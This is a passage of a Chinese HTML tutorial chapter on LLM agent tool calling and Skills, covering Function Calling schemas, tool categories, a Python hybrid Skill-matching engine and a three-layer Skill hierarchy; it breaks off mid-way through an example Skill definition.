@@ -1,0 +1,2713 @@
+<!-- 第5章：工具调用与Skills -->
+<h1 class="chapter-title">第5章 工具调用与 Skills</h1>
+<p class="chapter-subtitle">让 Agent 拥有与物理世界交互的能力</p>
+
+<!-- ===== 5.1 为什么需要工具 ===== -->
+<h2 class="section-heading">5.1 LLM 的能力边界</h2>
+
+<p>LLM 再强大，也有硬伤：</p>
+
+<div class="card">
+  <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-error);">
+      <strong style="color: var(--color-error);">❌ LLM 做不到的事</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 1.8; margin: 8px 0 0;">
+        <li>获取实时信息（天气、新闻、股价）</li>
+        <li>执行代码和数学计算</li>
+        <li>读写文件和数据库</li>
+        <li>发送消息和调用外部服务</li>
+        <li>访问互联网</li>
+      </ul>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">✅ 工具让 Agent 做到的事</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 1.8; margin: 8px 0 0;">
+        <li>搜索引擎获取实时信息</li>
+        <li>Python 沙箱执行代码</li>
+        <li>文件系统和数据库操作</li>
+        <li>发邮件、调 API、发消息</li>
+        <li>网页爬取和自动化操作</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="quote">
+  LLM 是大脑，工具是手脚。没有工具的 Agent 就像一个瘫痪的天才——什么都懂，但什么都做不了。
+</div>
+
+<!-- ===== 5.2 工具调用的演进 ===== -->
+<h2 class="section-heading">5.2 工具调用的三代演进</h2>
+
+<div class="step-animation" id="toolEvoSteps">
+  <div class="step-canvas">
+    <div class="step-content" id="toolEvoContent">
+      <div class="step-number">1</div>
+      <div class="step-title">第一代：Prompt 工程（2022-2023）</div>
+      <div class="step-desc">在 System Prompt 中描述工具格式，让 LLM 输出特定格式的文本（如 "Action: search(query)"），框架再解析执行。代表：ReAct 原始论文、LangChain Agent。</div>
+    </div>
+  </div>
+  <div class="step-controls">
+    <button class="step-btn" id="toolEvoPrev" disabled>←</button>
+    <span class="step-indicator" id="toolEvoIndicator">1 / 3</span>
+    <button class="step-btn" id="toolEvoNext">→</button>
+    <button class="step-replay" onclick="ToolEvo.reset()">重播</button>
+  </div>
+</div>
+
+<script>
+const ToolEvo = {
+  current: 0,
+  steps: [
+    { num: 1, title: '第一代：Prompt 工程（2022-2023）', desc: '在 System Prompt 中描述工具格式，让 LLM 输出特定格式的文本（如 "Action: search(query)"），框架再解析执行。代表：ReAct 原始论文、LangChain Agent。问题：格式不稳定，LLM 可能输出错误格式导致解析失败。' },
+    { num: 2, title: '第二代：Function Calling（2023+）', desc: 'OpenAI 在 GPT-4 中原生支持 Function Calling。传入工具的 JSON Schema，LLM 直接输出结构化的函数调用。格式可靠，支持并行调用。随后 Claude、Gemini 等模型纷纷跟进，成为行业标准。' },
+    { num: 3, title: '第三代：MCP 协议（2024+）', desc: 'Anthropic 推出 MCP（Model Context Protocol），标准化了工具的定义、发现和调用。一个 MCP Server 可被任何支持 MCP 的框架使用。工具从"框架私有"变为"生态共享"。' }
+  ],
+  render() {
+    const s = this.steps[this.current];
+    const c = document.getElementById('toolEvoContent');
+    c.innerHTML = `<div class="step-number">${s.num}</div><div class="step-title">${s.title}</div><div class="step-desc">${s.desc}</div>`;
+    c.classList.remove('fade-in'); void c.offsetWidth; c.classList.add('fade-in');
+    document.getElementById('toolEvoIndicator').textContent = `${this.current+1} / ${this.steps.length}`;
+    document.getElementById('toolEvoPrev').disabled = this.current === 0;
+    document.getElementById('toolEvoNext').disabled = this.current === this.steps.length - 1;
+  },
+  next() { if (this.current < this.steps.length-1) { this.current++; this.render(); } },
+  prev() { if (this.current > 0) { this.current--; this.render(); } },
+  reset() { this.current = 0; this.render(); }
+};
+document.getElementById('toolEvoNext').addEventListener('click', () => ToolEvo.next());
+document.getElementById('toolEvoPrev').addEventListener('click', () => ToolEvo.prev());
+window.ToolEvo = ToolEvo;
+</script>
+
+<!-- ===== 5.3 Function Calling 详解 ===== -->
+<h2 class="section-heading">5.3 Function Calling 详解</h2>
+
+<p>Function Calling 是目前工具调用的主流方式。来看完整的调用流程：</p>
+
+<div class="flowchart-container" id="fcFlow"></div>
+
+<script>
+setTimeout(() => {
+  FlowChart.render('fcFlow', {
+    nodes: [
+      { id: 'user', label: '用户请求', type: 'start' },
+      { id: 'llm1', label: 'LLM 分析\n+ 工具选择', type: 'process' },
+      { id: 'decision', label: '需要\n工具?', type: 'decision' },
+      { id: 'call', label: '输出函数调用\n{name, arguments}', type: 'tool' },
+      { id: 'exec', label: '框架执行\n实际函数', type: 'process' },
+      { id: 'llm2', label: 'LLM 整合\n结果生成回答', type: 'process' },
+      { id: 'answer', label: '返回用户', type: 'end' }
+    ],
+    edges: [
+      { from: 'user', to: 'llm1' },
+      { from: 'llm1', to: 'decision' },
+      { from: 'decision', to: 'call', label: '是' },
+      { from: 'decision', to: 'answer', label: '否，直接回答' },
+      { from: 'call', to: 'exec' },
+      { from: 'exec', to: 'llm2', label: '结果回传' },
+      { from: 'llm2', to: 'answer' }
+    ],
+    animate: true
+  });
+}, 300);
+</script>
+
+<h3 class="sub-heading">工具定义：JSON Schema</h3>
+
+<div class="code-block">
+  <span class="code-label">Function Calling 工具定义示例</span>
+<pre>// 定义工具
+const tools = [
+  {
+    type: "function",
+    function: {
+      name: "get_weather",
+      description: "获取指定城市的天气信息",
+      parameters: {
+        type: "object",
+        properties: {
+          city: {
+            type: "string",
+            description: "城市名称，如：北京、上海"
+          },
+          date: {
+            type: "string",
+            description: "日期，格式 YYYY-MM-DD，默认今天"
+          }
+        },
+        required: ["city"]
+      }
+    }
+  },
+  {
+    type: "function",
+    function: {
+      name: "run_python",
+      description: "执行 Python 代码并返回输出",
+      parameters: {
+        type: "object",
+        properties: {
+          code: {
+            type: "string",
+            description: "要执行的 Python 代码"
+          }
+        },
+        required: ["code"]
+      }
+    }
+  }
+];
+
+// 调用 LLM
+const response = await openai.chat.completions.create({
+  model: "gpt-4o",
+  messages: [{ role: "user", content: "北京明天天气怎么样？" }],
+  tools: tools  // 传入工具定义
+});
+
+// LLM 返回函数调用
+const toolCall = response.choices[0].message.tool_calls[0];
+// { name: "get_weather", arguments: '{"city":"北京","date":"2026-07-02"}' }
+
+// 执行实际函数
+const result = await getWeather("北京", "2026-07-02");
+
+// 结果回传 LLM 生成自然语言回答
+const finalResponse = await openai.chat.completions.create({
+  model: "gpt-4o",
+  messages: [
+    { role: "user", content: "北京明天天气怎么样？" },
+    response.choices[0].message,
+    { role: "tool", tool_call_id: toolCall.id, content: JSON.stringify(result) }
+  ]
+});</pre>
+</div>
+
+<!-- ===== 5.4 工具分类体系 ===== -->
+<h2 class="section-heading">5.4 工具分类体系</h2>
+
+<div class="card">
+  <div class="card-title">🔧 Agent 工具全景</div>
+  <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px;">
+    
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-info);">
+      <strong style="color: var(--color-info);">🔍 信息获取</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; margin: 8px 0 0; line-height: 1.8;">
+        <li>Web 搜索（Google/Bing API）</li>
+        <li>天气查询</li>
+        <li>新闻聚合</li>
+        <li>知识库检索（RAG）</li>
+        <li>数据库查询</li>
+      </ul>
+    </div>
+    
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-accent);">
+      <strong style="color: var(--color-accent);">⚙️ 代码执行</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; margin: 8px 0 0; line-height: 1.8;">
+        <li>Python REPL（沙箱）</li>
+        <li>Shell 命令执行</li>
+        <li>SQL 执行器</li>
+        <li>JavaScript 运行时</li>
+        <li>Jupyter Notebook</li>
+      </ul>
+    </div>
+    
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">📝 文件操作</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; margin: 8px 0 0; line-height: 1.8;">
+        <li>读写文件</li>
+        <li>创建/删除目录</li>
+        <li>文件搜索</li>
+        <li>PDF/Word/Excel 解析</li>
+        <li>文件格式转换</li>
+      </ul>
+    </div>
+    
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-warning);">
+      <strong style="color: var(--color-warning);">🌐 通信交互</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; margin: 8px 0 0; line-height: 1.8;">
+        <li>发送邮件</li>
+        <li>HTTP 请求</li>
+        <li>Webhook 调用</li>
+        <li>消息推送（Slack/Discord）</li>
+        <li>浏览器自动化</li>
+      </ul>
+    </div>
+    
+  </div>
+</div>
+
+<!-- ===== 5.5 Skills 概念 ===== -->
+<h2 class="section-heading">5.5 从 Tools 到 Skills</h2>
+
+<p>工具是原子能力。当多个工具组合成一个<strong>可复用的能力包</strong>时，就变成了 Skill（技能）。</p>
+
+<div class="compare-animation">
+  <div class="compare-side left">
+    <div class="side-label">Tool（工具）</div>
+    <div class="side-content">
+      <div class="highlight-line">单个函数，原子操作</div>
+      <div class="highlight-line">如：search(query)</div>
+      <div class="highlight-line">如：write_file(path, content)</div>
+      <div class="highlight-line">粒度细，可组合</div>
+      <div class="highlight-line" style="color: var(--color-text-tertiary);">= 一个螺丝刀</div>
+    </div>
+  </div>
+  <div class="compare-side right">
+    <div class="side-label">Skill（技能）</div>
+    <div class="side-content">
+      <div class="highlight-line">工具 + Prompt + 流程</div>
+      <div class="highlight-line">如：发邮件技能</div>
+      <div class="highlight-line">  = 起草邮件 + 查通讯录 + 发送</div>
+      <div class="highlight-line">粒度粗，可直接用</div>
+      <div class="highlight-line" style="color: var(--color-success);">= 一个工具箱</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="sub-heading">Skill 的组成结构</h3>
+
+<div class="code-block">
+  <span class="code-label">Skill 的典型结构</span>
+<pre>email_skill = {
+  "name": "send_email",
+  "description": "帮用户起草并发送邮件",
+  "tools": ["smtp_send", "search_contacts", "read_file"],
+  "prompt": """
+    你是一个邮件助手。当用户要发邮件时：
+    1. 确认收件人和主题
+    2. 起草邮件内容
+    3. 让用户确认
+    4. 调用 smtp_send 发送
+  """,
+  "examples": [
+    "帮我给张三发一封关于项目进度的邮件",
+    "通知全员明天10点开会"
+  ]
+}</pre>
+</div>
+
+<!-- ===== 5.6 工具选择策略 ===== -->
+<h2 class="section-heading">5.6 工具选择策略</h2>
+
+<p>当 Agent 有几十个工具时，怎么让 LLM 选对工具？</p>
+
+<div class="card">
+  <div class="card-title">🎯 工具选择的三种策略</div>
+  
+  <div style="margin-top: 16px;">
+    <strong style="color: var(--color-info);">1. 全量传入（小规模）</strong>
+    <p style="font-size: 14px; color: var(--color-text-secondary); margin: 6px 0 16px;">
+      把所有工具描述都传入 LLM。简单直接，但工具超过 20 个时 token 消耗大、准确率下降。
+    </p>
+    
+    <strong style="color: var(--color-accent);">2. 语义检索（中规模）</strong>
+    <p style="font-size: 14px; color: var(--color-text-secondary); margin: 6px 0 16px;">
+      把工具描述做 embedding 存入向量库。用户请求来时，先检索最相关的 Top-K 工具，只把这几个传给 LLM。类似 RAG 但检索的是工具而非文档。
+    </p>
+    
+    <strong style="color: var(--color-success);">3. 路由分层（大规模）</strong>
+    <p style="font-size: 14px; color: var(--color-text-secondary); margin: 6px 0;">
+      先用轻量模型或规则路由到工具类别（信息类/代码类/文件类），再在类别内用 LLM 选择具体工具。适合 100+ 工具的场景。
+    </p>
+  </div>
+</div>
+
+<!-- ===== 5.7 Skill匹配与路由机制 ===== -->
+<h2 class="section-heading">5.7 Skill 匹配与路由机制</h2>
+
+<p>上一节讲了工具选择的三种宏观策略，但当 Agent 注册了大量 Skill（技能包）时，用户输入进来后，系统如何<strong>精准匹配</strong>到最合适的 Skill？这就需要一套 Skill 匹配与路由机制——Skill 版的"导航系统"。</p>
+
+<div class="flowchart-container" id="skillMatchFlow"></div>
+
+<script>
+setTimeout(() => {
+  FlowChart.render('skillMatchFlow', {
+    nodes: [
+      { id: 'input', label: '用户输入', type: 'start' },
+      { id: 'intent', label: '意图识别\n理解用户目标', type: 'process' },
+      { id: 'keywords', label: '关键词提取\n从输入中抽取核心词', type: 'process' },
+      { id: 'index', label: 'Skill索引匹配\n查找声明能处理的Skill', type: 'process' },
+      { id: 'priority', label: '优先级排序\n多维评分综合排名', type: 'process' },
+      { id: 'select', label: 'Skill选择\n取Top-1或Top-K', type: 'decision' },
+      { id: 'execute', label: '执行Skill流程', type: 'tool' },
+      { id: 'output', label: '返回结果', type: 'end' }
+    ],
+    edges: [
+      { from: 'input', to: 'intent' },
+      { from: 'intent', to: 'keywords' },
+      { from: 'keywords', to: 'index' },
+      { from: 'index', to: 'priority' },
+      { from: 'priority', to: 'select' },
+      { from: 'select', to: 'execute', label: '匹配成功' },
+      { from: 'execute', to: 'output' }
+    ],
+    animate: true
+  });
+}, 300);
+</script>
+
+<h3 class="sub-heading">三种匹配策略</h3>
+
+<div class="card">
+  <div class="card-title">🎯 Skill 匹配的三种策略对比</div>
+  <div style="margin-top: 12px;">
+    <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
+      <thead>
+        <tr style="border-bottom: 2px solid var(--color-border);">
+          <th style="text-align: left; padding: 8px; color: var(--color-text-secondary);">策略</th>
+          <th style="text-align: left; padding: 8px; color: var(--color-text-secondary);">原理</th>
+          <th style="text-align: center; padding: 8px; color: var(--color-text-secondary);">准确率</th>
+          <th style="text-align: center; padding: 8px; color: var(--color-text-secondary);">延迟</th>
+          <th style="text-align: center; padding: 8px; color: var(--color-text-secondary);">适用场景</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr style="border-bottom: 1px solid var(--color-border);">
+          <td style="padding: 8px;"><strong style="color: var(--color-info);">关键词匹配</strong></td>
+          <td style="padding: 8px; font-size: 13px;">用户输入包含 Skill 声明的关键词 → 命中</td>
+          <td style="padding: 8px; text-align: center; color: var(--color-warning);">60~70%</td>
+          <td style="padding: 8px; text-align: center;">~5ms</td>
+          <td style="padding: 8px; text-align: center;">Skill少、关键词明确</td>
+        </tr>
+        <tr style="border-bottom: 1px solid var(--color-border);">
+          <td style="padding: 8px;"><strong style="color: var(--color-accent);">语义匹配</strong></td>
+          <td style="padding: 8px; font-size: 13px;">用户输入和 Skill 描述做 embedding → cosine相似度排名</td>
+          <td style="padding: 8px; text-align: center; color: var(--color-success);">80~90%</td>
+          <td style="padding: 8px; text-align: center;">~50ms</td>
+          <td style="padding: 8px; text-align: center;">Skill多、表述多样</td>
+        </tr>
+        <tr style="border-bottom: 1px solid var(--color-border);">
+          <td style="padding: 8px;"><strong style="color: var(--color-warning);">规则匹配</strong></td>
+          <td style="padding: 8px; font-size: 13px;">预定义正则/条件规则 → 精确命中</td>
+          <td style="padding: 8px; text-align: center;">95%+</td>
+          <td style="padding: 8px; text-align: center;">~2ms</td>
+          <td style="padding: 8px; text-align: center;">模式固定、高确定性场景</td>
+        </tr>
+        <tr>
+          <td style="padding: 8px;"><strong style="color: var(--color-success);">混合策略</strong></td>
+          <td style="padding: 8px; font-size: 13px;">规则优先 → 语义兜底 → 关键词补充</td>
+          <td style="padding: 8px; text-align: center; color: var(--color-success);">90%+</td>
+          <td style="padding: 8px; text-align: center;">~30ms</td>
+          <td style="padding: 8px; text-align: center;">生产环境推荐</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<div class="quote">
+  实际生产环境推荐<strong>混合策略</strong>：规则匹配处理高确定性场景（如"发邮件"一定命中邮件Skill），语义匹配兜底模糊表述（如"外面冷不冷"命中天气Skill），关键词补充边缘场景。单一策略都有盲区。
+</div>
+
+<h3 class="sub-heading">Skill 注册表设计</h3>
+
+<p>每个 Skill 需要声明自己能处理的意图类型和关键词，这样匹配引擎才能"查表"定位：</p>
+
+<div class="card">
+  <div class="card-title">📋 Skill 注册表结构</div>
+  <div style="margin-top: 16px;">
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-info);">
+      <strong style="color: var(--color-info);">intent_types</strong>：声明 Skill 能处理的意图类别（信息获取/代码执行/文件操作/通信交互），用于意图级粗筛。
+    </div>
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; margin-top: 8px; border-left: 3px solid var(--color-accent);">
+      <strong style="color: var(--color-accent);">keywords</strong>：声明触发关键词（如"邮件""发送""天气""查"），用于关键词匹配。
+    </div>
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; margin-top: 8px; border-left: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">description</strong>：Skill 的自然语言描述，用于语义匹配（embedding 相似度计算）。
+    </div>
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; margin-top: 8px; border-left: 3px solid var(--color-warning);">
+      <strong style="color: var(--color-warning);">rules</strong>：预定义的正则/条件规则，用于规则匹配（如 /帮我发.*邮件/ 一定命中邮件Skill）。
+    </div>
+  </div>
+</div>
+
+<h3 class="sub-heading">匹配评分机制</h3>
+
+<p>多维度评分是混合策略的核心——不同维度的分数加权汇总，选出综合最优的 Skill：</p>
+
+<div class="code-block">
+  <span class="code-label">Skill 匹配引擎实现</span>
+<pre>import re
+import numpy as np
+from typing import List, Dict, Optional
+from dataclasses import dataclass
+
+@dataclass
+class SkillRegistration:
+    """Skill 注册信息"""
+    skill_id: str
+    name: str
+    description: str           # 用于语义匹配
+    intent_types: List[str]     # 能处理的意图类别
+    keywords: List[str]         # 触发关键词
+    rules: List[str]            # 正则规则
+    tools: List[str]            # Skill 包含的工具
+    prompt_template: str        # Skill 的 Prompt 模板
+    version: str = "1.0.0"
+
+@dataclass
+class MatchScore:
+    """匹配评分结果"""
+    skill_id: str
+    semantic_score: float       # 语义相似度得分 (0~1)
+    keyword_score: float        # 关键词命中率得分 (0~1)
+    rule_score: float           # 规则匹配得分 (0 or 1)
+    history_score: float        # 历史使用频率得分 (0~1)
+    final_score: float          # 加权综合得分
+
+class SkillMatchEngine:
+    """Skill 匹配引擎 — 混合策略"""
+
+    # 各维度的权重（可按场景调优）
+    WEIGHTS = {
+        "semantic": 0.35,
+        "keyword":  0.25,
+        "rule":     0.30,
+        "history":  0.10
+    }
+
+    def __init__(self, skill_registry: Dict[str, SkillRegistration],
+                 embedding_model, usage_stats: Dict[str, int]):
+        self.registry = skill_registry
+        self.embedding_model = embedding_model
+        self.usage_stats = usage_stats  # skill_id → 使用次数
+
+        # 预计算所有 Skill 描述的 embedding
+        self.skill_embeddings = {}
+        for sid, skill in skill_registry.items():
+            self.skill_embeddings[sid] = embedding_model.encode(skill.description)
+
+    def match(self, user_input: str, intent_type: str, top_k: int = 3) -> List[MatchScore]:
+        """多维度评分 → 综合排名 → 返回 Top-K"""
+        scores = []
+
+        for sid, skill in self.registry.items():
+            # ① 意图粗筛：Skill 不支持该意图 → 直接跳过
+            if intent_type not in skill.intent_types:
+                continue
+
+            # ② 语义相似度
+            query_emb = self.embedding_model.encode(user_input)
+            skill_emb = self.skill_embeddings[sid]
+            semantic_score = float(np.dot(query_emb, skill_emb) /
+                (np.linalg.norm(query_emb) * np.linalg.norm(skill_emb)))
+
+            # ③ 关键词命中率
+            hit_count = sum(1 for kw in skill.keywords if kw in user_input)
+            keyword_score = hit_count / max(len(skill.keywords), 1)
+
+            # ④ 规则匹配
+            rule_score = 0.0
+            for rule_pattern in skill.rules:
+                if re.search(rule_pattern, user_input):
+                    rule_score = 1.0
+                    break  # 任一规则命中即满分
+
+            # ⑤ 历史使用频率
+            max_usage = max(self.usage_stats.values()) if self.usage_stats else 1
+            history_score = self.usage_stats.get(sid, 0) / max_usage
+
+            # ⑥ 加权综合评分
+            final_score = (
+                self.WEIGHTS["semantic"] * semantic_score +
+                self.WEIGHTS["keyword"]  * keyword_score +
+                self.WEIGHTS["rule"]     * rule_score +
+                self.WEIGHTS["history"] * history_score
+            )
+
+            scores.append(MatchScore(
+                skill_id=sid,
+                semantic_score=semantic_score,
+                keyword_score=keyword_score,
+                rule_score=rule_score,
+                history_score=history_score,
+                final_score=final_score
+            ))
+
+        # 按综合评分排序，返回 Top-K
+        scores.sort(key=lambda s: s.final_score, reverse=True)
+        return scores[:top_k]
+
+# ===== 使用示例 =====
+registry = {
+    "email_skill": SkillRegistration(
+        skill_id="email_skill",
+        name="send_email",
+        description="帮用户起草并发送邮件，支持搜索联系人",
+        intent_types=["通信交互"],
+        keywords=["邮件", "发送", "发信", "通知", "email"],
+        rules=[r"帮我发.*邮件", r"通知.*开会", r"给.*发信"],
+        tools=["smtp_send", "search_contacts"],
+        prompt_template="你是一个邮件助手..."
+    ),
+    "weather_skill": SkillRegistration(
+        skill_id="weather_skill",
+        name="get_weather",
+        description="查询指定城市的实时天气信息，包括温度、湿度、风速",
+        intent_types=["信息获取"],
+        keywords=["天气", "冷", "热", "下雨", "晴", "温度"],
+        rules=[r".*天气.*", r"外面.*冷.*"],
+        tools=["weather_api", "web_search"],
+        prompt_template="你是一个天气查询助手..."
+    ),
+}
+
+engine = SkillMatchEngine(registry, my_encoder, {"email_skill": 50, "weather_skill": 30})
+
+# 测试1: 规则命中 → 邮件Skill
+results = engine.match("帮我给张三发邮件", "通信交互")
+print(f"Top-1: {results[0].skill_id}, final={results[0].final_score:.2f}")
+# → email_skill, final=0.65 (rule=1.0×0.30 + keyword=0.4×0.25 + ...)
+
+# 测试2: 语义兜底 → 天气Skill
+results = engine.match("外面冷不冷", "信息获取")
+print(f"Top-1: {results[0].skill_id}, final={results[0].final_score:.2f}")
+# → weather_skill, final=0.48 (rule=1.0×0.30 + semantic≈0.5×0.35)</pre>
+</div>
+
+<div class="quote">
+  面试高频考点：Skill 匹配的混合策略优先级——<strong>规则匹配确定性最高</strong>（"帮我发邮件"一定命中邮件Skill），<strong>语义匹配覆盖面最广</strong>（"外面冷不冷"也能命中天气Skill），<strong>关键词匹配速度最快</strong>但准确率有限。三者互补而非互斥。
+</div>
+
+<!-- ===== 5.8 Skill分层体系与职责边界 ===== -->
+<h2 class="section-heading">5.8 Skill 分层体系与职责边界</h2>
+
+<p>Skill 为什么需要分层？想象一个 Agent 里既有"读文件"这种原子操作，又有"代码审查"这种复杂流程，还有"金融合规审查"这种领域专家级能力——如果它们混在一起，<strong>职责混乱、维护困难、性能浪费</strong>。</p>
+
+<div class="card">
+  <div class="card-title">❌ 不分层的三个问题</div>
+  <div style="margin-top: 16px;">
+    <div style="padding: 12px; border: 1px solid var(--color-border); border-radius: 8px; margin-bottom: 12px; border-left: 3px solid var(--color-error);">
+      <strong style="color: var(--color-error);">① 职责混乱</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">"读文件"和"金融合规审查"混在同一层级，开发时无法区分哪些是基础能力、哪些是业务逻辑。代码耦合严重。</p>
+    </div>
+    <div style="padding: 12px; border: 1px solid var(--color-border); border-radius: 8px; margin-bottom: 12px; border-left: 3px solid var(--color-error);">
+      <strong style="color: var(--color-error);">② 维护困难</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">修改一个底层原子操作会影响所有上层 Skill 的调用逻辑。没有层级隔离，改动牵一发而动全身。</p>
+    </div>
+    <div style="padding: 12px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-error);">
+      <strong style="color: var(--color-error);">③ 性能浪费</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">简单任务调用"金融合规审查"Skill，其中的复杂 Prompt 和多轮流程白白消耗 token。不分层意味着无法按任务复杂度选择合适的 Skill。</p>
+    </div>
+  </div>
+</div>
+
+<h3 class="sub-heading">三层 Skill 体系设计</h3>
+
+<div class="flowchart-container" id="skillLayerChart"></div>
+
+<script>
+setTimeout(() => {
+  FlowChart.render('skillLayerChart', {
+    nodes: [
+      { id: 'user', label: '用户需求\n"帮我做金融合规审查"', type: 'start' },
+      { id: 'l2', label: 'L2 业务层\n金融合规审查Skill\n理解业务领域', type: 'process' },
+      { id: 'l1', label: 'L1 组合层\n代码审查流程Skill\n编排工作流', type: 'process' },
+      { id: 'l0', label: 'L0 基础层\n读文件/搜索/执行\n原子操作', type: 'tool' },
+      { id: 'result', label: '业务结果\n合规/违规/建议', type: 'end' }
+    ],
+    edges: [
+      { from: 'user', to: 'l2' },
+      { from: 'l2', to: 'l1', label: '调用组合层编排流程' },
+      { from: 'l1', to: 'l0', label: '调用基础层原子操作' },
+      { from: 'l0', to: 'result' }
+    ],
+    animate: true
+  });
+}, 300);
+</script>
+
+<div class="card">
+  <div class="card-title">🏗️ 三层 Skill 体系详解</div>
+  <div style="margin-top: 16px;">
+
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 4px solid var(--color-success); margin-bottom: 12px;
+         background: linear-gradient(to right, var(--color-bg-tertiary), transparent);">
+      <strong style="color: var(--color-success);">L0 基础层 Skill — 原子操作</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">最底层，被上层调用。每个 L0 Skill 只做<strong>一件事</strong>：读文件、写文件、搜索、执行命令、发邮件。</p>
+      <div style="font-size: 12px; color: var(--color-text-tertiary); margin-top: 6px; padding: 6px 10px; background: var(--color-bg-secondary); border-radius: 4px;">
+        特征：单工具 + 简单 Prompt | 粒度最细 | 可独立测试 | 被L1/L2组合调用
+      </div>
+    </div>
+
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 4px solid var(--color-accent); margin-bottom: 12px;
+         background: linear-gradient(to right, var(--color-bg-tertiary), transparent);">
+      <strong style="color: var(--color-accent);">L1 组合层 Skill — 工作流编排</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">组合多个 L0 原子操作，编排成<strong>完整流程</strong>：代码审查流程（读代码→分析→生成报告）、部署发布流程（构建→测试→推送→通知）。</p>
+      <div style="font-size: 12px; color: var(--color-text-tertiary); margin-top: 6px; padding: 6px 10px; background: var(--color-bg-secondary); border-radius: 4px;">
+        特征：多工具 + 流程 Prompt | 有步骤顺序 | 可复用流程 | 被L2业务层调用
+      </div>
+    </div>
+
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 4px solid var(--color-info);
+         background: linear-gradient(to right, var(--color-bg-tertiary), transparent);">
+      <strong style="color: var(--color-info);">L2 业务层 Skill — 领域专家</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">直接面向用户需求，<strong>理解业务领域</strong>：金融分析（风控指标计算+合规判断+报告生成）、法律合规审查（条款检索+风险评估+整改建议）。</p>
+      <div style="font-size: 12px; color: var(--color-text-tertiary); margin-top: 6px; padding: 6px 10px; background: var(--color-bg-secondary); border-radius: 4px;">
+        特征：领域 Prompt + 调用L1流程 | 理解业务语义 | 输出业务结论 | 直接面向用户
+      </div>
+    </div>
+
+  </div>
+  <div style="margin-top: 12px; padding: 10px; background: var(--color-bg-tertiary); border-radius: 6px; font-size: 13px; color: var(--color-text-secondary);">
+    💡 <strong>层级职责边界</strong>：L0 只做一件事，L1 编排流程，L2 理解业务。上层只调用下层，不跨层调用，不反向依赖。
+  </div>
+</div>
+
+<h3 class="sub-heading">Skill 粒度权衡</h3>
+
+<div class="card">
+  <div style="margin-top: 16px;">
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+      <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-error);">
+        <strong style="color: var(--color-error);">❌ Skill 太粗</strong>
+        <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">一个"万能助手Skill"包含所有能力 → 不灵活，无法按需组合，修改一处影响全局。类似于把所有工具放一个函数里。</p>
+      </div>
+      <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-warning);">
+        <strong style="color: var(--color-warning);">❌ Skill 太细</strong>
+        <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">每个操作都拆成独立Skill → 调用链过长（5层嵌套），token浪费在层间传递上，编排开销大。</p>
+      </div>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-success); border-radius: 8px; margin-top: 12px; border-left: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">✅ 恰当粒度</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">L0 按原子操作拆分（一个工具一件事），L1 按业务流程组合（一个完整流程一个Skill），L2 按领域场景封装（一个业务场景一个Skill）。三层分工，粒度递增。</p>
+    </div>
+  </div>
+</div>
+
+<div class="code-block">
+  <span class="code-label">三层 Skill 定义代码</span>
+<pre>"""三层 Skill 体系定义"""
+
+# ===== L0 基础层：原子操作 =====
+l0_file_read_skill = {
+    "layer": "L0",
+    "name": "file_read",
+    "description": "读取指定路径的文件内容",
+    "tools": ["read_file"],          # 单工具
+    "prompt": "读取文件 {path} 的内容，返回完整文本。",
+    "intent_types": ["文件操作"],
+    "keywords": ["读", "查看文件", "读取"]
+}
+
+l0_web_search_skill = {
+    "layer": "L0",
+    "name": "web_search",
+    "description": "在互联网搜索指定关键词",
+    "tools": ["search_engine"],       # 单工具
+    "prompt": "搜索关键词 {query}，返回最相关的前5条结果。",
+    "intent_types": ["信息获取"],
